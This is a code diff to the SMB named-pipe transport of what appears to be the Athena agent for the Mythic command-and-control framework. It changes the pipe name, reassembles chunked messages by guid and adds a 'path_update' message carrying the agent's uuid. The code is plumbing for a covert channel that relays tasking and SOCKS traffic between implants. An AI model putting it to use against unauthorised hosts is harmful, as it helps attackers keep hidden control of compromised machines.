@@ -6,19 +6,15 @@ using Athena.Models.Mythic.Response;
 using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
 using System.Collections.Concurrent;
-
 using H.Pipes;
 using H.Pipes.Args;
 using H.Pipes.AccessControl;
-
 using System.Diagnostics;
 using System.IO.Pipes;
 using System.Security.AccessControl;
 using System.Security.Principal;
 using System.Text;
 using System.Text.Json;
-using Athena.Models;
-using H.Pipes.Extensions;
 using Athena.Models.Comms.SMB;
 
 namespace Athena
@@ -27,7 +23,7 @@ namespace Athena
     {
         public string uuid { get; set; }
         public string psk { get; set; }
-        public string pipeName = "scottie_pipe";
+        public string pipeName = "pipename";
         private string checkinResponse { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
@@ -107,6 +103,7 @@ namespace Athena
                     };
 
                     //Just send the stuff, I don't really currently know how to error check sends.
+                    Debug.WriteLine($"[{DateTime.Now}] Sending regular get_tasking");
                     await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
                 }
             }
@@ -190,14 +187,14 @@ namespace Athena
                     return;
                 }
 
-                this.partialMessages.TryAdd(args.Message.message_type, new StringBuilder()); //Either Add the key or it already exists
+                this.partialMessages.TryAdd(args.Message.guid, new StringBuilder()); //Either Add the key or it already exists
 
-                this.partialMessages[args.Message.message_type].Append(args.Message.delegate_message);
+                this.partialMessages[args.Message.guid].Append(args.Message.delegate_message);
 
                 if (args.Message.final)
                 {
-                    this.OnMythicMessageReceived(this.partialMessages[args.Message.message_type].ToString());
-                    this.partialMessages.Remove(args.Message.message_type, out _);
+                    this.OnMythicMessageReceived(this.partialMessages[args.Message.guid].ToString());
+                    this.partialMessages.TryRemove(args.Message.guid, out _);
                 }
 
                 await this.SendSuccess();
@@ -212,19 +209,8 @@ namespace Athena
             Debug.WriteLine($"[{DateTime.Now}] New Client Connected!");
             onClientConnectedSignal.Set();
             this.connected = true;
-            if (this.checkedin)
-            {
-                Debug.WriteLine($"[{DateTime.Now}] We're already checked in so sending a get_tasking");
-                GetTasking gt = new GetTasking()
-                {
-                    action = "get_tasking",
-                    tasking_size = -1,
-                    delegates = new List<DelegateMessage>(),
-                    socks = new List<SocksMessage>(),
-                    responses = new List<string>(),
-                };
-                await this.Send(JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking));
-            }
+
+            await this.SendUpdate();
         }
         private async Task OnClientDisconnect()
         {
@@ -257,6 +243,7 @@ namespace Athena
 
                 SmbMessage sm = new SmbMessage()
                 {
+                    guid = Guid.NewGuid().ToString(),
                     final = false,
                     message_type = "chunked_message"
                 };
@@ -275,7 +262,7 @@ namespace Athena
                     Debug.WriteLine($"[{DateTime.Now}] Sending message to pipe: {part.Length} bytes. (Final = {sm.final})");
 
                     await this.serverPipe.WriteAsync(sm);
-
+                    
                 }
 
                 Debug.WriteLine($"[{DateTime.Now}] Done writing message to pipe.");
@@ -294,9 +281,22 @@ namespace Athena
             //Indicate the server that we're done processing the message and it can send the next one (if it's there)
             SmbMessage sm = new SmbMessage()
             {
+                guid = Guid.NewGuid().ToString(),
                 message_type = "success",
                 final = true,
                 delegate_message = String.Empty
+            };
+
+            await this.serverPipe.WriteAsync(sm);
+        }
+        private async Task SendUpdate()
+        {
+            SmbMessage sm = new SmbMessage()
+            {
+                guid = Guid.NewGuid().ToString(),
+                final = true,
+                message_type = "path_update",
+                delegate_message = this.uuid
             };
 
             await this.serverPipe.WriteAsync(sm);
